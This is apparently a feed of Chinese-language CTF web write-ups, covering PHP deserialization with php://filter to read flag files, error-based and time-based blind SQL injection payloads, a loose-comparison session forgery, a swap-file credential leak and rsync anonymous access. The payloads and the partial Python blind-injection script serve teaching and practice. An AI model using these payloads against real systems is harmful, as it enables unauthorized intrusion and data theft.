php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">        $pass = unserialize($pass);</div><div class="line">        <span class="keyword">echo</span> $pass;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">&lt;!--</div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>看了源代码，f1a9这个应该是flag文件，那就不能直接读取了，再读取<code>class.php</code>试试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>配合刚刚的源码，可以想到用 反序列的方法去读取f1a9.php了，于是本地构造下序列化字符串。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> $file;  </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;  </div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);      </div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;  </div><div class="line">    &#125;  </div><div class="line">&#125;  </div><div class="line"></div><div class="line">$test = <span class="keyword">new</span> Read();</div><div class="line">$test-&gt;file = <span class="string">"php://filter/read=convert.base64-encode/resource=f1a9.php"</span>;</div><div class="line"><span class="keyword">echo</span> serialize($test);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>最后提交得到flag的base64的密文，解密下就行了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天还是有很多收获的，下面简单总结下再加深了解下，防止以后出现不会用</p><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="external">php:// — 访问各个输入/输出流（I/O streams）</a></p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><blockquote><p><code>php://input</code> 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 <code>php://input</code> 来代替 <code>$HTTP_RAW_POST_DATA</code>，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 <code>$HTTP_RAW_POST_DATA</code> 默认没有填充， 比激活 <code>always_populate_raw_post_data</code> 潜在需要更少的内存。 <code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的。</p></blockquote><p>实际使用的例子就是上面 admin 那题的 <code>user</code> 的输入内容</p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><blockquote><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()、 file()</code> 和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。</p></blockquote><p><img src="/images/shianbei02.png" alt="shianbei02"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php://filter/read=&lt;读链需要应用的过滤器列表&gt;</div></pre></td></tr></table></figure></p><h4 id="过滤器（内容参考）"><a href="#过滤器（内容参考）" class="headerlink" title="过滤器（内容参考）"></a>过滤器（<a href="http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1" target="_blank" rel="external">内容参考</a>）</h4><p>过滤器有很多种，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器</p><h5 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h5><blockquote><ul><li>string.rot13<br>进行rot13转换</li><li>string.toupper<br>将字符全部大写</li><li>string.tolower<br>将字符全部小写</li><li>string.strip_tags<br>去除空字符、HTML 和 PHP 标记后的结果<br>着重介绍一下这个，功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式</li></ul></blockquote><h5 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h5><blockquote><ul><li><code>convert.base64-encode &amp; convert.base64-decode</code><br>base64 编码解码<br><code>convert.base64-encode和convert.base64-decode</code>使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 <code>convert.base64-encode</code>支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用 line-length个字符为长度而截成块。如果给出了<code>* line-break-chars*</code>，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同。</li><li><code>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</code><br>quoted-printable 编码解码<br><code>convert.quoted-printable-encode和 convert.quoted-printable-decode</code>等同于用 quoted_printable_decode()函数处理所有的流数据。没有和<code>* convert.quoted-printable-encode*</code>相对应的函数。<code>* convert.quoted-printable-encode*</code>支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外，<code>convert.quoted-printable-encode</code>还支持布尔参数 binary和 force-encode-first。 <code>convert.base64-decode</code>只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。</li></ul></blockquote><h5 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h5><blockquote><ul><li>zlib.deflate和 zlib.inflate<br>zlib.deflate（压缩）和 zlib.inflate（解压）实现了定义与 » RFC 1951的压缩算法。 deflate过滤器可以接受以一个关联数组传递的最多三个参数。<code>* level*</code>定义了压缩强度（1-9）。数字更高通常会产生更小的载荷，但要消耗更多的处理时间。存在两个特殊压缩等级：0（完全不压缩）和 -1（zlib 内部默认值，目前是 6）。 window是压缩回溯窗口大小，以二的次方表示。更高的值（大到 15 —— 32768 字节）产生更好的压缩效果但消耗更多内存，低的值（低到 9 —— 512 字节）产生产生较差的压缩效果但内存消耗低。目前默认的 window大小是 15。 memory用来指示要分配多少工作内存。合法的数值范围是从 1（最小分配）到 9（最大分配）。内存分配仅影响速度，不会影响生成的载荷的大小。<br>Note: 因为最常用的参数是压缩等级，也可以提供一个整数值作为此参数（而不用数组）。</li><li>bzip2.compress和 bzip2.decompress<br>bzip2.compress过滤器接受以一个关联数组给出的最多两个参数：<code>* blocks*</code>是从 1 到 9 的整数值，指定分配多少个 100K 字节的内存块作为工作区。 work是 0 到 250 的整数值，指定在退回到一个慢一些，但更可靠的算法之前做多少次常规压缩算法的尝试。调整此参数仅影响到速度，压缩输出和内存使用都不受此设置的影响。将此参数设为 0 指示 bzip 库使用内部默认算法。 bzip2.decompress过滤器仅接受一个参数，可以用普通的布尔值传递，或者用一个关联数组中的<code>* small*</code>单元传递。当<em> small</em>设为<code>&amp;true;</code> 值时，指示 bzip 库用最小的内存占用来执行解压缩，代价是速度会慢一些。</li></ul></blockquote><h5 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h5><blockquote><p><code>_mcrypt.*_和 _mdecrypt.*_</code>使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为<em>mcrypt.ciphername</em>，其中 ciphername是密码的名字，将被传递给 mcrypt_module_open()。有以下五个过滤器参数可用：<br><img src="/images/shianbei03.png" alt="shianbei03"></p></blockquote><p>就拿我上面admin那题的例子 是这样使用的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php://filter/convert.base64-encode/resource=index.php</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天和几个大校的同学玩了下世安杯，然后遇到网站一直502也是挺醉的，下面是web部分的wp，自己写了下&lt;br&gt;
    
    </summary>
    
      <category term="writeup-web" scheme="https://isky0t.github.io/categories/writeup-web/"/>
    
    
      <category term="CTF" scheme="https://isky0t.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="https://isky0t.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>mooctest-writeup</title>
    <link href="https://isky0t.github.io/2017/10/05/mooctest-writeup/"/>
    <id>https://isky0t.github.io/2017/10/05/mooctest-writeup/</id>
    <published>2017-10-05T14:47:38.000Z</published>
    <updated>2017-10-13T01:43:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>做了些ctf的题目，想参加mooctest试试吧，就当锻炼锻炼。这个是平台上的资格测试的题目。<br><a id="more"></a></p><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><blockquote><p>报错都给你了，还不会注入？ 题目地址：<a href="http://114.55.36.69:20680/index.php?table=news&amp;id=3" target="_blank" rel="external">http://114.55.36.69:20680/index.php?table=news&amp;id=3</a></p></blockquote><p>根据提示应该是报错注入，选择一个报错函数 直接上吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">?table=news&amp;id=3 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</div><div class="line">XPATH syntax error: &apos;~errorerror@localhost~&apos;</div><div class="line"></div><div class="line">?table=news&amp;id=3 and (updatexml(1,concat(0x7e,(select database()),0x7e),1))</div><div class="line">XPATH syntax error: &apos;~errorerror~&apos;</div><div class="line"></div><div class="line">table=news&amp;id=3 and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;errorerror&apos;),0x7e),1))</div><div class="line">XPATH syntax error: &apos;~error_flag,error_news~&apos;</div><div class="line"></div><div class="line">?table=news&amp;id=3 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.tables where table_schema=&apos;errorerror&apos; and table_name=&apos;error_flag&apos;),0x7e),1))</div><div class="line">然后并没有爆出字段，而是显示了hacker，看来过滤了column_name</div></pre></td></tr></table></figure></p><p>在群里问了一声，一个朋友给出了资料</p><ul><li><a href="http://www.wupco.cn/?p=3764" target="_blank" rel="external">sql注入tips【被雨牛和俊杰师傅打开的新世界大门</a></li><li><a href="http://www.yulegeyu.com/2017/04/16/%E5%BD%93%E8%A1%A8%E5%90%8D%E5%8F%AF%E6%8E%A7%E7%9A%84%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E4%BA%86Describe%E6%97%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82/" target="_blank" rel="external">当表名可控的注入遇到了Describe时的几种情况</a></li></ul><p>了解一番新姿势后，于是里面的payload都给出了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">?table=news`%23` where 0=extractvalue(1,(select group_concat(0x3a,column_name) from information_schema.columns where table_name=&apos;error_flag&apos;))%23`%26id=1&amp;id=3</div><div class="line">XPATH syntax error: &apos;:flag_you_will_never_know&apos;</div></pre></td></tr></table></figure></p><p>详解请看上面的链接，解释的很清楚，学到了一波！<br>最后再根据字段查询一下，得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?table=news&amp;id=3 and (updatexml(1,concat(0x7e,(select `flag_you_will_never_know` from error_flag limit 0,1),0x7e),1))</div></pre></td></tr></table></figure></p><h2 id="babylogin"><a href="#babylogin" class="headerlink" title="babylogin"></a>babylogin</h2><blockquote><p>很正常的登录逻辑，只是… </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</div><div class="line"></div><div class="line">header(<span class="string">"Content-Type:text/html;charset=utf8"</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SESSION)&amp;&amp;$_SESSION[<span class="string">"login"</span>]==<span class="number">1</span>) &#123;</div><div class="line">        header(<span class="string">"Location: admin.php"</span>); </div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key) &#123;</div><div class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $key2 =&gt; $value) &#123;</div><div class="line">        $_GPC[$key2]=$value;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//var_dump($_GPC);exit();</span></div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>]==<span class="string">"GET"</span>)&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="keyword">include</span> <span class="string">"outputtpl.php"</span>;</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>]==<span class="string">"POST"</span>)&#123;</div><div class="line">    </div><div class="line">    $userin=addslashes($_POST[<span class="string">"name"</span>]);</div><div class="line">    $passin=addslashes($_POST[<span class="string">"password"</span>]);</div><div class="line">    $session = json_decode(base64_decode($_GPC[<span class="string">'__session'</span>]), <span class="keyword">true</span>);</div><div class="line">    <span class="keyword">if</span> (is_array($session))&#123;</div><div class="line">        $user = find_user_by_uid($session[<span class="string">'uid'</span>]);</div><div class="line">        <span class="keyword">if</span>(is_array($user) &amp;&amp; $session[<span class="string">'hash'</span>] == $user[<span class="string">'password'</span>])&#123;</div><div class="line">            $_SESSION[<span class="string">"login"</span>]=<span class="number">1</span>;</div><div class="line">            $_SESSION[<span class="string">"userin"</span>]=$userin;</div><div class="line">            header(<span class="string">"Location: admin.php"</span>);</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $sql = <span class="string">"select password from admin where username='$userin'"</span>;</div><div class="line">        $row = mysql_fetch_array(mysql_query($sql));</div><div class="line">        <span class="keyword">if</span>($row)&#123;</div><div class="line">            <span class="keyword">if</span>($row[$passin]==md5($passin))&#123;</div><div class="line">                $_SESSION[<span class="string">"login"</span>]=<span class="number">1</span>;</div><div class="line">                $_SESSION[<span class="string">"userin"</span>]=$userin;</div><div class="line">                header(<span class="string">"Location: admin.php"</span>);</div><div class="line">                <span class="keyword">exit</span>();</div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</div><div class="line">        &#125;    </div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"GET or POST plz!"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>思考一会儿之后，记起 <code>true == &#39;string&#39;</code> 是为真，于是逆向构造下<code>__session</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$__session = array(&apos;uid&apos;=&gt;&apos;1&apos;,&apos;hash&apos; =&gt;true);</div><div class="line">echo base64_encode(json_encode($__session));</div></pre></td></tr></table></figure></p><p>提交payload，得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=admin&amp;password=password&amp;__session=eyJ1aWQiOiIxIiwiaGFzaCI6dHJ1ZX0=</div></pre></td></tr></table></figure></p><h2 id="编辑器的锅"><a href="#编辑器的锅" class="headerlink" title="编辑器的锅"></a>编辑器的锅</h2><blockquote><p>login as admin 题目地址：<a href="http://114.55.36.69:20380/login.php" target="_blank" rel="external">http://114.55.36.69:20380/login.php</a></p></blockquote><p>猜测是vim编辑器吧，访问 <code>.login.php.swp</code> 下载到文件，然后cat查看后得到部分源码，格式没排版<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo "GET or POST plz!";&#125;else &#123;    &#125;        echo "用户名或密码错误";    &#125;else&#123;        &#125;            echo "用户名或密码错误";        &#125;else&#123;            exit();            header("Location: admin.php");            $_SESSION["userin"]=$userin;            $_SESSION["login"]=1;        if($passin=="ca1buda0mima7ah4ha")&#123;    if ($userin=="admin94wo")&#123;    $passin=$_POST["password"];    $userin=$_POST["name"];    &#125;else if($_SERVER["REQUEST_METHOD"]=="POST")&#123;EOT;&lt;/body&gt;&lt;/html&gt;&lt;/div&gt;    &lt;/div&gt;                        &lt;/form&gt;            &lt;/p&gt;                            &lt;p&gt;            &lt;/p&gt;                                &lt;button type="submit" class="btn btn-l w-100 primary"&gt;登录&lt;/button&gt;            &lt;p class="submit"&gt;            &lt;/p&gt;                &lt;input id="password" name="password" class="text-l w-100" placeholder="密码" type="password"&gt;                &lt;label for="password" class="sr-only"&gt;密码&lt;/label&gt;            &lt;p&gt;            &lt;/p&gt;                &lt;input id="name" name="name" placeholder="用户名" class="text-l w-100" autofocus="" type="text"&gt;                &lt;label for="name" class="sr-only"&gt;用户名&lt;/label&gt;            &lt;p&gt;        &lt;form action="" method="post" name="login" role="form" &gt;        &lt;h1&gt;登录&lt;/h1&gt;    &lt;div class="typecho-login" &gt;&lt;div class="typecho-login-wrap"&gt;        &lt;body class="body-100"&gt;&lt;/head&gt;&lt;link rel="stylesheet" href="res/style.css"&gt;&lt;link rel="stylesheet" href="res/grid.css"&gt;        &lt;link rel="stylesheet" href="res/normalize.css"&gt;        &lt;meta name="robots" content="noindex, nofollow"&gt;        &lt;title&gt;用户登录&lt;/title&gt;        &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;        &lt;meta name="renderer" content="webkit"&gt;        &lt;meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1"&gt;        &lt;meta charset="UTF-8"&gt;&lt;meta http-equiv="content-type" content="text/html; charset=UTF-8"&gt;&lt;html class="no-js"&gt;&lt;head&gt;&lt;!DOCTYPE html&gt;&lt;&lt;&lt;EOT    echo if ($_SERVER["REQUEST_METHOD"]=="GET")&#123;    &#125;        exit();        header("Location: admin.php"); if (!empty($_SESSION)&amp;&amp;$_SESSION["login"]==1) &#123;session_start();header("Content-Type:text/html;charset=utf8");&lt;?php%</div></pre></td></tr></table></figure></p><p><code>username=admin94w&amp;password=ca1buda0mima7ah4ha</code> 提交得flag</p><h2 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h2><blockquote><p>虽然代码同步了，但你这个配置…有问题 题目地址：<a href="http://118.178.18.181:20280/" target="_blank" rel="external">http://118.178.18.181:20280/</a></p></blockquote><p>经狗哥提醒是rsync，于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rsync 118.178.18.181::</div><div class="line"></div><div class="line">source code</div></pre></td></tr></table></figure></p><p>返回这个内容，但是中间有个空格，那就引号包裹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">rsync 118.178.18.181::&quot;source code&quot;</div><div class="line">drwxr-xr-x        4096 2017/06/14 13:01:20 .</div><div class="line">-rw-r--r--          44 2017/06/14 13:01:20 flag.php</div><div class="line">-rw-r--r--          26 2017/06/14 13:01:20 index.php</div><div class="line"></div><div class="line">rsync 118.178.18.181::&quot;source code/flag.php&quot; /Users/isky/Desktop</div></pre></td></tr></table></figure></p><p><a href="http://www.91ri.org/11093.html" target="_blank" rel="external">关于rsync</a></p><blockquote><p>rsync(remote synchronize)——Linux下实现远程同步功能的软件，能同步更新两处计算机的文件及目录。在同步文件时，可以保持源文件的权限、时间、软硬链接等附加信息。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员；而开发人员安全意识薄弱、安全技能欠缺往往是导致rsync出现相关漏洞的根源。<br>rsync默认配置文件为/etc/rsyncd.conf，常驻模式启动命令rsync –daemon，启动成功后默认监听于TCP端口873，可通过rsync-daemon及ssh两种方式进行认证。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做了些ctf的题目，想参加mooctest试试吧，就当锻炼锻炼。这个是平台上的资格测试的题目。&lt;br&gt;
    
    </summary>
    
      <category term="writeup-web" scheme="https://isky0t.github.io/categories/writeup-web/"/>
    
    
      <category term="CTF" scheme="https://isky0t.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="https://isky0t.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>shiyanbar-writeup</title>
    <link href="https://isky0t.github.io/2017/10/02/shiyanbar-writeup/"/>
    <id>https://isky0t.github.io/2017/10/02/shiyanbar-writeup/</id>
    <published>2017-10-02T07:49:09.000Z</published>
    <updated>2017-10-05T12:30:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近想参加CTF的比赛，于是国庆放假做一下实验吧的web部分题目 并简单做个记录，并非完全是自己的writeup吧 和别人共同讨论吧！<br><a id="more"></a></p><h2 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h2><blockquote><p>不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!</p></blockquote><p>题干给出这些提示，尝试一些注入关键字<br><code>union</code>、<code>or</code>、<code>||</code>、<code>select</code>、<code>#</code>、<code>--</code>、<code>//</code> 等等这些字符均被过滤 大小写无用<br>但是<code>&#39;</code>并未过滤 初步认为这应该不是一个寻常的SQL注入题吧？猜测SQL语句应该为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">"$_POST['u']"</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">"$_POST['p']"</span></div></pre></td></tr></table></figure><p>而后和朋友讨论后  得出 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">''</span>=<span class="string">''</span></div></pre></td></tr></table></figure><p>其实语句就变成了这样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span></div></pre></td></tr></table></figure><p>提交<code>&#39;=&#39;</code>后得flag，并显示所有的username和password</p><h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h2><blockquote><p>我要把攻击我的人都记录db中去!</p></blockquote><p>打开页面显示 <strong><em>your ip is :x.x.x.x</em></strong></p><p>初步猜测后端代码获取访问者的ip并插入到数据库中，于是尝试修改提交header中的xff字段注入</p><p><img src="/images/shiyanbar01sql.png" alt="sql test"></p><p>经过测试发现存在注入，和猜测的没错，只不过这里不能用<code>if(expr1,expr2,expr3)</code>函数，因为遇到<code>,</code>就断了。应该是和insert中的冲突了吧，于是只能用两个and来判断 ，决定尝试写个Python跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></div><div class="line">    payloads = <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'</span>  <span class="comment"># 所有的字符串</span></div><div class="line">    result = <span class="string">''</span>  <span class="comment"># 存放结果</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Start to SQL test:'</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</div><div class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</div><div class="line">            startTime = time.time()</div><div class="line">            sql = <span class="string">"1.1.1.1' and (select user() like '"</span> + result + payload + <span 